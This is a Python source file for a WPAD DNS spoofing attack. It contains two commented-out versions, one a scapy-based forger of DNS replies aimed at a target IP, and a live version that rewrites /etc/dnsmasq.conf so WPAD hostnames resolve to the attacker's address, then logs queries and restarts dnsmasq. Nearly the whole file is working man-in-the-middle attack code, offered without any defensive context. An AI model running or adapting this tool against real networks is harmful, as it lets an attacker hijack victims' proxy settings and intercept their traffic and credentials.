# from scapy.all import IP, DNSQR, DNSRR, DNS, sniff, conf, UDP, send,sr1
# from termcolor import cprint

# def __poison_response(pkt):
#     original_qname = pkt[DNSQR].qname
#     if WPAD_HOSTNAME in str(original_qname):
#         fake_dns_pkt = IP()/UDP()/DNS()/DNSRR()

#         fake_dns_pkt[IP].src = ROUTER_IP
#         fake_dns_pkt[IP].dst = TARGET_IP

#         fake_dns_pkt[UDP].sport = 53
#         fake_dns_pkt[UDP].dport = pkt[UDP].sport

#         fake_dns_pkt[DNS].id = pkt[DNS].id
#         fake_dns_pkt[DNS].qd = pkt[DNS].qd
#         fake_dns_pkt[DNS].aa = 1
#         fake_dns_pkt[DNS].qr = 1
#         fake_dns_pkt[DNS].ancount = 1

#         fake_dns_pkt[DNSRR].qname = WPAD_HOSTNAME + '.'
#         fake_dns_pkt[DNSRR].rrname = WPAD_HOSTNAME + '.'
#         fake_dns_pkt[DNSRR].rdata = ATTACKER_IP

#         cprint(f'Sending spoofed dns packet: {WPAD_HOSTNAME} = {ATTACKER_IP}')
#         send(fake_dns_pkt, verbose=0)
#     else:
#         forward_pkt = IP()/UDP()/DNS()
#         forward_pkt[IP].dst = GOOGLE_DNS
#         forward_pkt[UDP].sport = pkt[UDP].sport
#         forward_pkt[DNS].rd = 1
#         forward_pkt[DNS].qd = DNSQR(qname=original_qname)

#         google_response = sr1(forward_pkt, verbose=0)

#         response_pkt = IP()/UDP()/DNS()
#         response_pkt[IP].src = ATTACKER_IP
#         response_pkt[IP].dst = TARGET_IP
#         response_pkt[UDP].dport = pkt[UDP].sport
#         response_pkt[DNS] = google_response[DNS]

#         send(response_pkt, verbose=0)
    

# def run(router_ip, target_ip, interface):
#     global ATTACKER_IP
#     global ROUTER_IP
#     global TARGET_IP
#     global WPAD_HOSTNAME
#     global GOOGLE_DNS

    

#     ATTACKER_IP = conf.ifaces[interface].ip
#     ROUTER_IP = router_ip
#     TARGET_IP = target_ip
#     WPAD_HOSTNAME = 'wpad.localdomain'
#     GOOGLE_DNS = '8.8.8.8'


#     cprint('*** FAKE DNS server is running ***', 'red', attrs=['bold', 'blink', 'reverse'])

#     bpf_filter = f'udp dst port 53 and not src host {ATTACKER_IP} and src host {TARGET_IP}'

#     sniff(prn=__poison_response, filter=bpf_filter, iface=interface)



#!/usr/bin/env python3

# import os
# import re
# import subprocess
# import time
# from termcolor import cprint
# # Global variables (will be updated dynamically)
# ATTACKER_IP = None
# ROUTER_IP = None
# TARGET_IP = None
# WPAD_HOSTNAME = "wpad.localdomain"
# GOOGLE_DNS = "8.8.8.8"
# ALT_DNS = "8.8.4.4"


# def get_attacker_ip(interface):
#     """Retrieve attacker's IP from the specified interface."""
#     try:
#         result = subprocess.run(["ip", "-4", "addr", "show", interface], capture_output=True, text=True)
#         match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
#         return match.group(1) if match else None
#     except Exception as e:
#         print(f"Error getting attacker IP: {e}")
#         return None

# def update_dnsmasq_config():
#     """Update /etc/dnsmasq.conf with the attacker's IP for WPAD attack."""
#     config_path = "/etc/dnsmasq.conf"

#     new_config = f"""
# server={GOOGLE_DNS}
# server={ALT_DNS}
# local=/localdomain/
# address=/{WPAD_HOSTNAME}/{ATTACKER_IP}
# """

#     try:
#         with open(config_path, "w") as f:
#             f.write(new_config)
#         print(f"[+] Updated dnsmasq.conf with attacker IP: {ATTACKER_IP}")
#     except Exception as e:
#         print(f"[-] Failed to update dnsmasq.conf: {e}")

# def restart_dnsmasq():
#     """Restart dnsmasq service to apply new settings."""
#     os.system("systemctl restart dnsmasq")
#     time.sleep(2)  # Give it time to restart
#     status = os.system("systemctl is-active --quiet dnsmasq")
#     if status == 0:
#         cprint('*** FAKE DNS server is running ***', 'red', attrs=['bold', 'blink', 'reverse'])
        
#         print("[+] dnsmasq restarted successfully")
#     else:
#         print("[-] dnsmasq failed to restart")

# def run(router_ip, target_ip, interface):
#     """Main function to configure dnsmasq dynamically."""
#     global ATTACKER_IP, ROUTER_IP, TARGET_IP

#     print("[+] Configuring dnsmasq for WPAD attack...")

#     # Set global variables
#     ATTACKER_IP = get_attacker_ip(interface)
#     ROUTER_IP = router_ip
#     TARGET_IP = target_ip

#     if not ATTACKER_IP:
#         print("[-] Could not determine attacker IP. Exiting.")
#         return

#     update_dnsmasq_config()
#     restart_dnsmasq()


import os
import re
import subprocess
import time
from termcolor import cprint

# Global variables (will be updated dynamically)
ATTACKER_IP = None
ROUTER_IP = None
TARGET_IP = None
WPAD_HOSTNAME = "wpad.localdomain"
GOOGLE_DNS = "8.8.8.8"
ALT_DNS = "8.8.4.4"

def get_attacker_ip(interface):
    """Retrieve attacker's IP from the specified interface."""
    try:
        result = subprocess.run(["ip", "-4", "addr", "show", interface], capture_output=True, text=True)
        match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
        return match.group(1) if match else None
    except Exception as e:
        print(f"Error getting attacker IP: {e}")
        return None

def update_dnsmasq_config():
    """Update /etc/dnsmasq.conf with the attacker's IP for WPAD attack and DNS forwarding."""
    config_path = "/etc/dnsmasq.conf"

    new_config = f"""
# Forward all unknown queries to Google DNS
server={GOOGLE_DNS}
server={ALT_DNS}

# Spoof WPAD to point to the attacker's IP
address=/{WPAD_HOSTNAME}/{ATTACKER_IP}
address=/wpad/192.168.29.7

# Act as a full DNS server and forward external queries
no-resolv
log-queries
log-facility=/var/log/dnsmasq.log
"""

    try:
        with open(config_path, "w") as f:
            f.write(new_config)
        print(f"[+] Updated dnsmasq.conf with attacker IP: {ATTACKER_IP}")
    except Exception as e:
        print(f"[-] Failed to update dnsmasq.conf: {e}")

def restart_dnsmasq():
    """Restart dnsmasq service to apply new settings."""
    os.system("systemctl restart dnsmasq")
    time.sleep(2)  # Give it time to restart
    status = os.system("systemctl is-active --quiet dnsmasq")
    if status == 0:
        cprint('*** FAKE DNS server is running ***', 'red', attrs=['bold', 'blink', 'reverse'])
        print("[+] dnsmasq restarted successfully")
    else:
        print("[-] dnsmasq failed to restart")

def stop_dnsmasq():
    """Stop dnsmasq service when script exits."""
    os.system("systemctl stop dnsmasq")
    print("[+] dnsmasq stopped")

def run(router_ip, target_ip, interface):
    """Main function to configure dnsmasq dynamically."""
    global ATTACKER_IP, ROUTER_IP, TARGET_IP

    print("[+] Configuring dnsmasq for WPAD attack...")

    # Set global variables
    ATTACKER_IP = get_attacker_ip(interface)
    ROUTER_IP = router_ip
    TARGET_IP = target_ip

    if not ATTACKER_IP:
        print("[-] Could not determine attacker IP. Exiting.")
        return

    update_dnsmasq_config()
    restart_dnsmasq()

    # Stop dnsmasq when script exits
    try:
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        stop_dnsmasq() 